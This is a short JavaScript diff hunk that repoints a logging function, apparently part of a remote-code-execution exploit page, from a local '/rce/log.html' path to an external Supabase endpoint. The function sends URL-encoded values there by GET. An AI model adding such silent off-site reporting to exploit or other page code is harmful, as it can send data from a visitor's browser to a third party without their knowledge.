@@ -28,7 +28,7 @@ function print(x, reportError = false, dumphex = false) {
     }
     let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
     const xhr = new XMLHttpRequest();
-    xhr.open("GET", "/rce/log.html?" + req , false);
+    xhr.open("GET", "https://nctvwxiqzbedgcmetyal.supabase.co/functions/v1/log?" + req , false);
     xhr.send(null);
 }
   function getJS(fname,method = 'POST') 
